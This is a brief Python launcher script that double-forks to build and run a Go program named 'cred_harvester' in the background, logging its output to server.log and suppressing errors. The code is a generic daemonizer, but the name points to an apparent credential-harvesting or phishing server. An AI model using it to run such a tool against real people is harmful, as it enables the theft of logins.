#!/usr/bin/python3


from os import fork, system


def daemon(cmd: str):
    pid2 = fork()
    if pid2 == 0:
        pid = fork()
        if pid == 0:
            system(cmd)
    exit(0)


if __name__ == '__main__':
    progname = "cred_harvester"
    logfile = "server.log"
    cmd = f"go build && ./{progname} 1>>{logfile} 2>/dev/null"
    daemon(cmd)